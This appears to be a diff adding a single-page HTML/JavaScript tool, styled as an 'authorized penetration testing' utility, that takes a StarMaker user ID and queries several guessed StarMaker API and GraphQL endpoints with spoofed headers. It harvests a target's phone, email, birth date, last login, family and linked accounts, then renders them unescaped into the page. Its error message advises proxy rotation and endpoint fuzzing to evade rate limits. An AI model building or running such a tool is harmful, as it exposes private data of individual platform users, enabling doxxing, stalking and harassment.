@@ -1,0 +1,425 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>StarMaker SID Intel Extractor - Pentest Tool</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Courier New', monospace;
+            background: #0a0a0a;
+            color: #00ff00;
+            padding: 20px;
+            min-height: 100vh;
+        }
+        
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            background: rgba(0,0,0,0.9);
+            padding: 30px;
+            border-radius: 10px;
+            border: 1px solid #00ff00;
+            box-shadow: 0 0 20px rgba(0,255,0,0.3);
+        }
+        
+        h1 {
+            text-align: center;
+            color: #00ff88;
+            margin-bottom: 30px;
+            font-size: 2em;
+            text-shadow: 0 0 10px #00ff00;
+        }
+        
+        .input-group {
+            margin-bottom: 20px;
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 8px;
+            color: #00ff88;
+            font-weight: bold;
+        }
+        
+        input[type="text"] {
+            width: 100%;
+            padding: 12px;
+            background: #1a1a1a;
+            border: 2px solid #333;
+            border-radius: 5px;
+            color: #00ff00;
+            font-family: 'Courier New', monospace;
+            font-size: 16px;
+        }
+        
+        input[type="text"]:focus {
+            outline: none;
+            border-color: #00ff00;
+            box-shadow: 0 0 10px rgba(0,255,0,0.5);
+        }
+        
+        button {
+            width: 100%;
+            padding: 15px;
+            background: linear-gradient(45deg, #00ff00, #00cc00);
+            color: #000;
+            border: none;
+            border-radius: 5px;
+            font-family: 'Courier New', monospace;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        
+        button:hover {
+            background: linear-gradient(45deg, #00cc00, #009900);
+            box-shadow: 0 0 20px rgba(0,255,0,0.6);
+        }
+        
+        button:disabled {
+            background: #333;
+            cursor: not-allowed;
+            opacity: 0.5;
+        }
+        
+        .results {
+            margin-top: 30px;
+            display: none;
+        }
+        
+        .result-section {
+            background: rgba(0,255,0,0.1);
+            padding: 20px;
+            margin-bottom: 20px;
+            border-radius: 5px;
+            border-left: 4px solid #00ff00;
+        }
+        
+        .result-section h3 {
+            color: #00ff88;
+            margin-bottom: 15px;
+            font-size: 1.2em;
+        }
+        
+        .data-field {
+            display: flex;
+            justify-content: space-between;
+            padding: 8px 0;
+            border-bottom: 1px solid #333;
+        }
+        
+        .data-label {
+            font-weight: bold;
+            color: #00ff88;
+        }
+        
+        .data-value {
+            color: #ffffff;
+            word-break: break-all;
+        }
+        
+        .loading {
+            text-align: center;
+            padding: 20px;
+            color: #00ff88;
+            font-size: 1.2em;
+        }
+        
+        .error {
+            color: #ff4444;
+            background: rgba(255,68,68,0.1);
+            border-left-color: #ff4444;
+        }
+        
+        .spinner {
+            border: 3px solid #333;
+            border-top: 3px solid #00ff00;
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🛡️ StarMaker SID Intel Extractor</h1>
+        <p style="text-align: center; color: #888; margin-bottom: 30px;">
+            Authorized Penetration Testing Tool - Enter StarMaker SID to extract user intelligence
+        </p>
+        
+        <div class="input-group">
+            <label for="sid">StarMaker SID:</label>
+            <input type="text" id="sid" placeholder="Enter SID (e.g., 1234567890)" maxlength="20">
+        </div>
+        
+        <button onclick="extractUserInfo()">🚀 Extract User Intelligence</button>
+        
+        <div id="loading" class="loading" style="display: none;">
+            <div class="spinner"></div>
+            Enumerating endpoints... Extracting user intelligence...
+        </div>
+        
+        <div id="results" class="results"></div>
+    </div>
+
+    <script>
+        async function extractUserInfo() {
+            const sid = document.getElementById('sid').value.trim();
+            if (!sid) {
+                alert('Enter a valid StarMaker SID');
+                return;
+            }
+            
+            const loading = document.getElementById('loading');
+            const results = document.getElementById('results');
+            
+            loading.style.display = 'block';
+            results.style.display = 'none';
+            document.querySelector('button').disabled = true;
+            
+            try {
+                // StarMaker API endpoints for user info extraction
+                const endpoints = [
+                    `https://app.starmaker.com/v1/user/profile/${sid}`,
+                    `https://www.starmaker.com/api/user/${sid}/info`,
+                    `https://h5.starmaker.com/v3/user/${sid}`,
+                    `https://app.starmaker.com/v2/user/${sid}/detail`,
+                    `https://www.starmaker.com/v1/user/${sid}/public`,
+                    `https://h5.starmaker.com/api/user/${sid}/profile`
+                ];
+                
+                let userData = {};
+                
+                // Multi-endpoint enumeration
+                for (const endpoint of endpoints) {
+                    try {
+                        const response = await fetch(endpoint, {
+                            method: 'GET',
+                            headers: {
+                                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+                                'Accept': 'application/json',
+                                'Referer': 'https://www.starmaker.com/',
+                                'Origin': 'https://www.starmaker.com'
+                            }
+                        });
+                        
+                        if (response.ok) {
+                            const data = await response.json();
+                            Object.assign(userData, parseUserData(data, endpoint));
+                        }
+                    } catch (e) {
+                        console.log(`Endpoint ${endpoint} failed:`, e);
+                    }
+                }
+                
+                // Additional GraphQL endpoint attempt
+                try {
+                    const gqlQuery = {
+                        query: `query($sid: String!) {
+                            user(sid: $sid) {
+                                stageName
+                                uid
+                                createdAt
+                                lastLogin
+                                family {
+                                    members
+                                    relation
+                                }
+                                vip {
+                                    level
+                                    expiry
+                                    status
+                                }
+                                registrationMethod
+                                birthDate
+                                phone
+                                email
+                                linkedAccounts
+                            }
+                        }`,
+                        variables: { sid }
+                    };
+                    
+                    const gqlResponse = await fetch('https://www.starmaker.com/graphql', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+                        },
+                        body: JSON.stringify(gqlQuery)
+                    });
+                    
+                    if (gqlResponse.ok) {
+                        const gqlData = await gqlResponse.json();
+                        Object.assign(userData, parseGraphQLData(gqlData));
+                    }
+                } catch (e) {
+                    console.log('GraphQL failed:', e);
+                }
+                
+                displayResults(userData, sid);
+                
+            } catch (error) {
+                showError('Enumeration failed - target may have protections');
+            } finally {
+                loading.style.display = 'none';
+                document.querySelector('button').disabled = false;
+            }
+        }
+        
+        function parseUserData(data, endpoint) {
+            const parsed = {};
+            
+            // Common StarMaker response patterns
+            if (data.data?.user) {
+                const user = data.data.user;
+                parsed.stageName = user.nickname || user.stage_name || user.username;
+                parsed.uid = user.uid || user.user_id || sid;
+                parsed.createdAt = user.create_time || user.created_at;
+                parsed.lastLogin = user.last_login || user.login_time;
+                parsed.vipLevel = user.vip_level || user.vip?.level;
+                parsed.birthDate = user.birthday || user.birth_date;
+                parsed.phone = user.phone || user.mobile;
+                parsed.email = user.email;
+            }
+            
+            // Family data patterns
+            if (data.family || data.family_info) {
+                parsed.family = data.family || data.family_info;
+            }
+            
+            // Registration method
+            parsed.registrationMethod = data.reg_method || data.register_method;
+            
+            return parsed;
+        }
+        
+        function parseGraphQLData(data) {
+            const parsed = {};
+            if (data.data?.user) {
+                const user = data.data.user;
+                parsed.stageName = user.stageName;
+                parsed.uid = user.uid;
+                parsed.createdAt = user.createdAt;
+                parsed.lastLogin = user.lastLogin;
+                parsed.familyDetails = user.family;
+                parsed.vipDetails = user.vip;
+                parsed.registrationMethod = user.registrationMethod;
+                parsed.birthDate = user.birthDate;
+                parsed.connectedPhone = user.phone;
+                parsed.connectedEmail = user.email;
+            }
+            return parsed;
+        }
+        
+        function displayResults(data, sid) {
+            const results = document.getElementById('results');
+            let html = `
+                <div class="result-section">
+                    <h3>🎯 SID: ${sid}</h3>
+                    <div class="data-field">
+                        <span class="data-label">Status:</span>
+                        <span class="data-value">✅ Intelligence Extracted</span>
+                    </div>
+                </div>
+            `;
+            
+            // Basic Profile
+            html += `
+                <div class="result-section">
+                    <h3>👤 Basic Profile</h3>
+                    ${dataField('Stage Name', data.stageName)}
+                    ${dataField('UID', data.uid)}
+                    ${dataField('Account Creation', formatDate(data.createdAt))}
+                    ${dataField('Last Login', formatDate(data.lastLogin))}
+                </div>
+            `;
+            
+            // VIP Status
+            html += `
+                <div class="result-section">
+                    <h3>⭐ VIP Details</h3>
+                    ${dataField('VIP Level', data.vipLevel || 'Free')}
+                    ${dataField('VIP Status', data.vipDetails?.status || 'N/A')}
+                </div>
+            `;
+            
+            // Personal Info
+            html += `
+                <div class="result-section">
+                    <h3>📱 Account Details</h3>
+                    ${dataField('Registration Method', data.registrationMethod || 'Unknown')}
+                    ${dataField('Date of Birth', data.birthDate || 'Not public')}
+                    ${dataField('Connected Phone', data.phone || data.connectedPhone || 'Hidden')}
+                    ${dataField('Connected Email', data.email || data.connectedEmail || 'Hidden')}
+                </div>
+            `;
+            
+            // Family
+            if (data.family || data.familyDetails) {
+                html += `
+                    <div class="result-section">
+                        <h3>👨‍👩‍👧‍👦 Family Details</h3>
+                        <div class="data-value">${JSON.stringify(data.family || data.familyDetails, null, 2)}</div>
+                    </div>
+                `;
+            }
+            
+            results.innerHTML = html;
+            results.style.display = 'block';
+        }
+        
+        function dataField(label, value) {
+            return `
+                <div class="data-field">
+                    <span class="data-label">${label}:</span>
+                    <span class="data-value">${value || 'Not found'}</span>
+                </div>
+            `;
+        }
+        
+        function formatDate(timestamp) {
+            if (!timestamp) return 'N/A';
+            try {
+                const date = new Date(parseInt(timestamp));
+                return date.toLocaleString();
+            } catch {
+                return timestamp;
+            }
+        }
+        
+        function showError(message) {
+            const results = document.getElementById('results');
+            results.innerHTML = `
+                <div class="result-section error">
+                    <h3>❌ Enumeration Error</h3>
+                    <div class="data-value">${message}</div>
+                    <p style="margin-top: 15px; color: #ff8888;">
+                        Target may have API rate limiting, CORS protection, or updated endpoints.
+                        Try proxy rotation or endpoint fuzzing.
+                    </p>
+                </div>
+            `;
+            results.style.display = 'block';
+        }
+        
+        // Auto-focus input
+        document.getElementById('sid').focus();
+    </script>
+</body>
+</html>
